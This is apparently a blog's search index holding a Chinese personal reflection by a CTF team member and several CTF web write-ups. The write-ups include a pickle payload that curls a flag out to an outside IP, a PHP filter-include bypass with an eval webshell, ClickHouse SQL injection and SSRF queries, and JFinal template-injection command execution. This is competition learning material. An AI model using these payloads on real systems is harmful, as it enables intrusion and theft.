<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>十月</title>
      <link href="2021/10/27/%E5%8D%81%E6%9C%88/"/>
      <url>2021/10/27/%E5%8D%81%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<p>今天想小歇一下，整理一下这段时间干的，思考下我是什么，想想以后的事。</p><p>我是一个很懒的人，生活、学习、思考，对于所有的事情都是这样，就像一个玩世不恭的纨绔公子，必须要我感兴趣，或者是被逼着，才肯干事。这样不好，也一直在尝试改变自己，以前的话，如果没有人提醒我督促我，那我就会控制不住自己去放下要干的事，现在我会给自己施加一些或积极或消极的心理暗示，逼迫自己去学习，压抑心性是很难的事，我很容易受环境影响，又很喜欢想一些有的没的的事，我需要更成熟一些。</p><p>特别想谭总，以前带队不需要担心，我只需要跟在谭总后面做小跟班就好了，看着谭总操作，学好就完事了。比赛的时候也不需要想那么多，有谭总在呢，没那么多压力，大不了就是爆个零，再说了有谭总在呢，一直都是在心里想着谭总啥都会，都搜得到，每次遇到不会的，也不肯去多搜多想，一直都是等谭总的说法了。</p><p>但是这样不可能有成长哇，要是一直这样，我怎么配带队哇，那不就是一个纯混子了咩，如果这样下去会让对我抱有希望的那些人失望的。一定要做出改变，之前惰性频发，一直窝在寝室不想来实验室这边，所有“在寝室也一样搞学习”的想法都只是我懒惰的借口罢了，事实上在寝室里又能学些什么呢，室友们都在玩游戏，风气是怎样的自己不清楚吗，还有“带室友搞学习”，难道不可笑吗，已经两年了，效果是什么样的难道没有B数吗自己心里，还是太懒了，一懒，就想瘫着，就想摆烂，这不就是废物的转化过程嘛。</p><p>不能用没人督促来作为不思上进的借口啊，为什么自己的学习要别人来督促呢，不应该本来就要学好的吗，看看自己这个样子，是大佬吗？显然不是，那么别人大佬一直在学习，我又凭什么这样懒下去呢，为什么不能坚持下去呢。英语四级没过，考研没有准备，网安学艺不精，这样和在寝室摆烂的，实际上没区别吖，只是一个在实验室混日子摆烂，一个在寝室好歹还玩到了游戏罢了。</p><p>回想一下我的实验室学习路程，有几个挺重要的转折点。</p><p>其一，是刚入实验室那段时间，特别是寒假，一路高歌猛进，学习劲头最大，但是后来被疫情困在家里，又捡起了本来抛下的游戏，混了足足一个学期和暑假，中间的比赛全都是消极对待，这样的后果就是太菜，在后面的国赛里因为差了我那道 web 进总决；湖湘杯也是因为我忘记改密码导致队伍被打穿；NSSC 的时候个人赛因为忘记了 cat 出的 php 文件内容不会直接显示在网页上，错失第一，团队赛上的贡献聊胜于无。</p><p>其二，就是我自觉太菜，感觉学得很难受，学习劲头到了谷底的时候，一次比赛结束之后，谭总和我聊天，就和我说了他对我的希望，还聊了之前我研究的小思路对那次比赛的帮助，说要我鼓起劲来好好搞，直接给我打了一卡车鸡血。</p><p>其三，是大二寒假在家偷懒，不肯学，不想学，开学之后也深感没啥意思，就去找黄总，借口说想去考研，那是最没有学习目标，也没有学习劲头的时候了，黄总问了我个问题，把我从悬崖边拉回来了，“你确定你现在去准备考研能坚持下去吗”，现在再想起来，真不可能坚持下来，说不定当时如果黄总什么也不说，放我走，那现在我应该会每天在寝室打游戏吧。</p><p>其四，当时一直很缺乏自信，后来挺怪的吧，无论是哪个比赛打得好，都带给不了我任何高兴，只感觉自己越来越菜，后来做了某比赛的一道题，全场零解，终于三天里面把它复现出来，而且还是一血，当时那种感觉，就很奇妙，彷佛自己一下子就起飞了，而且还认识了出题人和一些别的师傅，就自信一下子就出来了，就很神奇。于是后来的 cstc 和铁三也拿到了不错的成绩。</p><p>其五，是自己突然又不想打比赛了，想养老了，但是想了很久又把自己拉回来了。</p><p>仔细想想，似乎除开大一寒假，我的其它三个长假都在摆烂，唉……回想了这么久，突然发现自己的状态一直都是沉沉浮浮，非常多的时候都是看着自己的心情在决定学与不学，所以学到的东西又浅，自己的知识面也很窄，才会一直待在谭总的庇荫下，早就该走出来了。</p><hr><p>最近打了拟态强网杯，取得了不错的成绩。只是很可惜线下没了，改成了线上，不能去南京旅游了，直接哭死呜呜呜。（但是队友实在太有意思了）</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1635323041069558/082a0c708343ea50ddbc7dc688d22244a6690d98.png"></p><p>还打了 Byte，也有个挺有意思的，没进属于是可惜了。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1635323275546676/6c511c0da3cf6323f23d3e03d9eabce04803a305.png"></p><hr><p>接下来继续好好学吧，希望我可以成为一个合格的队长，带好这个队，也早日成为大佬吧QAQ</p><p>不管怎么说，既然我可以连着四五个小时失败和重开四百多次的冰与火之舞同一关，那还有什么我坚持不下去的事呢。</p><hr><p>最后随便提一嘴感情方面</p><p>—— 么必要啊</p>]]></content>
      
      
      <categories>
          
          <category> 瞎BB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_强网拟态_WP</title>
      <link href="2021/10/25/2021-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-WP/"/>
      <url>2021/10/25/2021-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-WP/</url>
      
        <content type="html"><![CDATA[<p>兄弟姐妹们太棒了，我愿称你们为最强~恭喜 xp xd ~</p><p><img src="https://i.loli.net/2021/10/25/ynUDFjYXPoeR4vg.png"></p><p>在这里记录一下 Web 题的题解叭。</p><h2 id="zerocalc"><a href="#zerocalc" class="headerlink" title="zerocalc"></a>zerocalc</h2><p>这题是签到 js，本来以为挺复杂的，就让队友去看了，结果队友也想偏了，第二天我看的时候随便试了一下 readFile(‘/flag’)，然后就挺意外的。。。</p><p><img src="https://i.loli.net/2021/10/25/wIQOHxUN6bar4Vz.png"></p><h2 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h2><p>题目给了源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template_string, url_for,redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    info = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>pickle 反序列化，不过给限定了 module in [‘config’] 和 ‘__’，然后看看 config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">notadmin=&#123;<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;no&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> notadmin[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd    )</span><br><span class="line">        <span class="built_in">eval</span>(s)</span><br></pre></td></tr></table></figure><p>可以尝试利用 c &amp; s 操作码进行全局变量覆盖，将 notadmin 中的 admin 修改为 yes 执行 eval</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>然后直接用 curl 把 flag 带出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还是🍋骚</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line">session = requests.Client(base_url=<span class="string">&quot;http://124.71.183.254:32770/&quot;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0(S&quot;__import__(&#x27;os&#x27;).system(&#x27;curl http://106.15.90.116:11451/?fuxk-$(cat /flag | base64)&#x27;)&quot;</span></span><br><span class="line"><span class="string">iconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">session.get(<span class="string">&quot;/&quot;</span>, params=&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: base64.b64encode(data).decode()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/25/h1StUYdHC3cLMRi.png"></p><p>这里利用到了 i 操作码</p><blockquote><p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p></blockquote><h2 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h2><p>原题。。。当时打过比赛的，就不写了，from 天翼杯2021 的 jackson</p><h2 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h2><p>这题本来早就出了，我傻逼了。。。</p><p>就是访问 feature.php?id=2 发现了 Cookie 中存在 API，base64 解码后发现是我们传入的值拼接 .js，同时发现 /old/feature.php 中存在任意文件读取，修改 Cookie 中的 API 即可任意文件读取，读取 flag.php 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&quot;API&quot;</span>: <span class="string">&quot;L3Zhci93d3cvaHRtbC9mbGFnLnBocA%3D%3D&quot;</span>&#125;</span><br><span class="line">conn = requests.get(<span class="string">&quot;http://123.60.75.243:32766/old/feature.php&quot;</span>, cookies=cookie)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(conn.text) </span><br></pre></td></tr></table></figure><h2 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h2><p>题目给出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;./&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;w&#x27;</span>)&#123;</span><br><span class="line">    @mkdir(<span class="string">&quot;./files/&quot;</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = bin2hex(random_bytes(<span class="number">5</span>));</span><br><span class="line">    file_put_contents(<span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>,base64_encode(<span class="variable">$content</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;r&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;./files/&quot;</span>.<span class="variable">$r</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;php://filter/resource=<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谭总教的 fuzz 一下，第一天没 fuzz 出来，第二天随便试了一下出了，人傻了……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span>, <span class="keyword">array</span> <span class="variable">$errcontext</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> === error_reporting()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">ErrorException</span>(<span class="variable">$errstr</span>, <span class="number">0</span>, <span class="variable">$errno</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">128</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$test</span> = chr(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;php://filter/resource=123$&#123;test&#125;123/resource=a.txt&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;         &quot;</span>.<span class="variable">$test</span>.<span class="string">&quot;     &quot;</span>.<span class="variable">$e</span>-&gt;getMessage().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了 @ 字符有点骚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">60         &lt;     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123&lt;123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">61         &#x3D;     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123&#x3D;123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">62         &gt;     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123&gt;123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">63         ?     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123?123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">64         @     include(php:&#x2F;&#x2F;...@123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">65         A     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123A123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">66         B     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123B123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">67         C     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123C123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br><span class="line">68         D     include(php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;123D123&#x2F;resource&#x3D;a.txt): failed to open stream: operation failed</span><br></pre></td></tr></table></figure><p>可以尝试发送 <code>@/../../../index.php</code> 构造出 <code>php://filter/resource=./files/@/../../../index.php</code> 成功读取 index.php，所以可以尝试包含一下 files 下的文件，我们先传入一个包含了 <code>&lt;?php phpinfo();?&gt;</code> 的文件，然后尝试构造 <code>convert.base64-decode/resource@/../../../files/34699711a2</code> ，成功包含：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;w&amp;c&#x3D;&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/25/rCnOmBkuKgxaADH.png"></p><p> 所以我们可以直接传入一个一句话木马：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;w&amp;c&#x3D;&lt;?php%20eval($_POST[1]);?&gt;</span><br><span class="line">POST</span><br><span class="line">1&#x3D;?&gt;&lt;?&#x3D;&#96;cat &#x2F;flag&#96;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/25/aVzKL5cvDtWBwN8.png"></p><h2 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h2><p>简单的 rogue_mysql，抓包改一下数据库类型，就把 flag 带出来就完事了……</p><p><img src="https://i.loli.net/2021/10/25/P8Aya5bj26dEwCx.png"></p><p>PS：</p><p>🍋说看到我这个 。。。 的写法说受不住，舒服了</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Jomadas_WEB3_WP</title>
      <link href="2021/10/20/2021-Jomadas-WEB3-WP/"/>
      <url>2021/10/20/2021-Jomadas-WEB3-WP/</url>
      
        <content type="html"><![CDATA[<ul><li>index.php?option 存在任意文件读取，可以读取源码</li><li>upload 一个 zip 上去，phar 读取，路径：phar://uploads/$(md5(passwd))/$(md5(key)).jpg/1（zip 中包含一个 1.php 的文件）</li></ul><p>贴图纪念一下，Make 男童收割者 Great~</p><p><img src="https://i.loli.net/2021/10/20/9uHC8kX53tJOmiK.png"></p><p><img src="https://i.loli.net/2021/10/20/dGi9pVCZTuWEFmh.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_ByteCTF_WP</title>
      <link href="2021/10/16/2021-ByteCTF-WP/"/>
      <url>2021/10/16/2021-ByteCTF-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-double-sqli"><a href="#Web-double-sqli" class="headerlink" title="Web-double sqli"></a>Web-double sqli</h2><p>这题是真的学新知识，完全没用过的 clickhouse，看了一下午的文档。</p><p>考点：</p><ul><li>Nginx 目录穿越</li><li>clickhouse sql 注入</li></ul><p>构造 /files../ 可以访问到根目录，以读取配置文件及一些敏感信息：（Nginx在配置别名(Alias)的时候,如果忘记加 /,将造成一个目录穿越漏洞）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">port: 9000</span><br><span class="line">user_01: e3b0c44298fc1c149afb</span><br></pre></td></tr></table></figure><p>随便输了点七里八里的值得到了后端逻辑</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ByteCTF <span class="keyword">FROM</span> hello <span class="keyword">WHERE</span> <span class="number">1</span> <span class="operator">=</span> `$<span class="keyword">sql</span>`</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/gsOl4y5HeBSJ26a.jpg"></p><p>clickhouse 的文档：<a href="https://clickhouse.com/docs/zh/sql-reference/statements/select/all/">https://clickhouse.com/docs/zh/sql-reference/statements/select/all/</a></p><p>可以构造出：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.tables limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> name <span class="keyword">from</span> system.databases limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf.hint limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctf.flag limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>clickhouse 和之前学过的 sql 有蛮多区别，我们当前的用户是 user_02，没有权限去读 ctf.flag，在 /var/lib/clickhouse/ 发现了 user_01 用户及其密码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ATTACH <span class="keyword">USER</span> user_01 IDENTIFIED <span class="keyword">WITH</span> plaintext_password <span class="keyword">BY</span> <span class="string">&#x27;e3b0c44298fc1c149afb&#x27;</span>;</span><br><span class="line">ATTACH <span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> ctf.<span class="operator">*</span> <span class="keyword">TO</span> user_01;</span><br></pre></td></tr></table></figure><p>饶了四五个小时绕回来最开始看到的 url 函数（老子一🔪把尼🐎🦈了，然后爬尼🐎坟上撒尿，最后偷吃尼🐎贡品🍎）</p><p>最后，clickhouse 提供了一个屌寄霸接口在 8123 端口，可以利用 clickhouse 自带的函数 url 来 ssrf 然后打内网</p><blockquote><p>The HTTP interface lets you use ClickHouse on any platform from any programming language. We use it for working from Java and Perl, as well as shell scripts. In other departments, the HTTP interface is used from Perl, Python, and Go. The HTTP interface is more limited than the native interface, but it has better compatibility.</p><p>By default, <code>clickhouse-server</code> listens for HTTP on port 8123 (this can be changed in the config).</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> url(<span class="string">&#x27;http://127.0.0.1:8123/?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag&#x27;</span>, CSV, <span class="string">&#x27;column1 String&#x27;</span>))</span><br></pre></td></tr></table></figure><p>flag 给👴出：<code>ByteCTF&#123;e3b0c44298fc1c149afbf4c8&#125;</code></p><p><img src="https://i.loli.net/2021/10/16/JqVWQIX2ALd3btO.png"></p><hr><p>最后补充一个🍋研究的盲注的思路~</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">OR</span> startsWith((extractAll(((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> system.databases limit <span class="number">1</span>,<span class="number">1</span>)<span class="number">.2</span>), <span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]),<span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>extractAll(str, ‘.’) 可以将字符串逐位分割，同时数组可以使用 [0] 进行访问而元组可以使用 .0 的方式访问。使用 startsWith 配合字符串可以进行逐位爆破。</p><h2 id="Web-Unsecure-Blog"><a href="#Web-Unsecure-Blog" class="headerlink" title="Web-Unsecure Blog"></a>Web-Unsecure Blog</h2><p>后台 admin，账号密码 jfnial / 111111</p><p>可以在浏览发现一个 jfinal enjoy 模板的 ssti，可以表达式注入：（文档：<a href="https://jfinal.com/doc/6-4%EF%BC%89">https://jfinal.com/doc/6-4）</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#(x=123)#(x)#(123)</span><br></pre></td></tr></table></figure><p>构造生成类：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#(1.class.forName(&quot;java.lang.Runtime&quot;))</span><br><span class="line">#(1.class.forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&#x27;java.lang.ProcessBuilder(&#x27;calc&#x27;).start()&#x27;))</span><br></pre></td></tr></table></figure><hr><p>上述表达式有问题，比赛的时候有段时间测的可以，不过后来不行了，如图<img src="https://i.loli.net/2021/10/19/JzLsYclhZ54MwGR.jpg"></p><p><img src="https://i.loli.net/2021/10/19/uyHkMsU7lWLbeSQ.jpg"></p><p>贴一下 JFinal Enjoy 的内置黑名单的类 <code>com.jfinal.template.expr.ast.MethodKit</code> 的源码：<a 